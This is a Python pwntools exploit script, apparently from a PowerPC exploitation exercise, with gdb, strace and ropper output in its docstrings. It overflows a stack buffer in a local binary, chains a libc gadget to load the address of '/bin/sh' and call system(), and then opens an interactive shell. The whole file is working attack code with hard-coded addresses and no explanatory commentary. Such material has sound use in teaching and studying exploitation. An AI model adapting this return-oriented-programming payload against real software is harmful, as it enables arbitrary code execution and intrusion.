#!/usr/bin/python

"""
(gdb) disassemble vulnerable 
Dump of assembler code for function vulnerable:
   0x1000052c <+0>:	stwu    r1,-144(r1)
...
   0x10000580 <+84>:	lwz     r0,4(r11)
   0x10000584 <+88>:	mtlr    r0
   0x10000588 <+92>:	lwz     r31,-4(r11)
   0x1000058c <+96>:	mr      r1,r11
   0x10000590 <+100>:	blr
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x10000540: file src/06-system-rop.c, line 6.
(gdb) b *0x10000580
Breakpoint 2 at 0x10000580: file src/06-system-rop.c, line 11.
(gdb) b *0x10000590
Breakpoint 3 at 0x10000590: file src/06-system-rop.c, line 11.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/06-system-rop.c:6
6		printf("> ");
(gdb) p &buffer[0]
$1 = 0xffffdda8 "\377\377\336\b"
(gdb) c
Continuing.

Breakpoint 2, 0x10000580 in vulnerable () at src/06-system-rop.c:11
11	}
(gdb) p/x $r11+4
$2 = 0xffffde34
(gdb) c
Continuing.

Breakpoint 3, 0x10000590 in vulnerable () at src/06-system-rop.c:11
11	}
(gdb) i r $r1
r1             0xffffde30	4294958640
"""

"""
$ qemu-ppc -L /usr/powerpc-linux-gnu/ -strace ./bin/ppc/06-system-rop
...
21069 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
21069 mmap2(0x0fe2c000,1848680,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x0fe2c000
...
"""

"""
$ ropper --nocolor --file /usr/powerpc-linux-gnu/lib/libc-2.27.so
0x00123b38: lwz r0, 0x34(r1); mr r3, r31; lwz r31, 0x2c(r1); addi r1, r1, 0x30; mtlr r0; blr; 
"""

import struct
import sys

from pwn import *

context(arch='powerpc', os='linux', endian='big', word_size=32)

binary_path = './bin/ppc/06-system-rop'
libc_path = '/usr/powerpc-linux-gnu/lib/libc-2.27.so'

saved_pc_addr = 0xffffde34
buffer_addr = 0xffffdda8
libc_addr = 0x0fe2c000

mr_r3_r31_lwz_r31_addr = libc_addr + 0x00123b38

libc = ELF(libc_path)
system_addr = libc_addr + libc.symbols['system']
bin_sh_addr = libc_addr + libc.search('/bin/sh\x00').next()

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (saved_pc_addr - buffer_addr)
payload += p32(mr_r3_r31_lwz_r31_addr)
# <- $r1 + 8
payload += 'b' * (0x2c - 8)
payload += p32(bin_sh_addr) # r31
payload += 'c' * (0x34 - 4 - 0x2c)
payload += p32(mr_r3_r31_lwz_r31_addr) # r0
# <- $r1 + 8
payload += 'd' * (0x34 - 8)
payload += p32(system_addr) # r0

p.readuntil('> ')
p.write(payload)
p.interactive()
